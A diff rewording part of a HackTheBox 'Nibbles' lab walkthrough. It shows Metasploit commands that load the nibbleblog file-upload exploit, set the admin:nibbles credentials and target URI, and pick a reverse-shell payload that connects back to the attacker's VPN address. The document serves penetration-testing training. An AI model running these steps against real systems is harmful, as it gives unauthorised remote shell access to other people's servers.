@@ -16,7 +16,8 @@ Matching Modules
 
 Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nibbleblog_file_upload
 ```
-- We can then type `use 0` to load the selected exploit. Set the `rhosts` option as the target IP address and `lhosts` as the IP address of your `tun0` adapter (the one that comes with the VPN connection to HackTheBox).
+- We'll use exploit 0, so let's type in `use 0` to load the selected exploit.
+- Set the `rhosts` option as the target IP address and `lhosts` as the IP address of your `tun0` adapter, which comes with the VPN connection to HackTheBox.
 ```shell-session
 msf6 > use 0
 [*] No payload configured, defaulting to php/meterpreter/reverse_tcp
@@ -58,7 +59,7 @@ Exploit target:
 --  ----
   0   Nibbleblog 4.0.3
 ```
-- We need to set the admin username and password `admin:nibbles` and the `TARGETURI` to `nibbleblog`.
+- Now, we need to set the admin username/password to `admin:nibbles`, as well as the `TARGETURI` to `nibbleblog`.
 ```shell-session
 msf6 exploit(multi/http/nibbleblog_file_upload) > set username admin
 username => admin
@@ -67,7 +68,9 @@ password => nibbles
 msf6 exploit(multi/http/nibbleblog_file_upload) > set targeturi nibbleblog
 targeturi => nibbleblog
 ```
-- We also need to change the payload type. For our purposes let's go with `generic/shell_reverse_tcp`. We put these options and then type `exploit` and receive a reverse shell.
+- We also need to change the payload type. 
+- For our purposes let's use `generic/shell_reverse_tcp`. 
+- Once we are ready, then we can run `exploit` and receive a reverse shell.
 ```shell-session
 msf6 exploit(multi/http/nibbleblog_file_upload) > set payload generic/shell_reverse_tcp
 payload => generic/shell_reverse_tcp
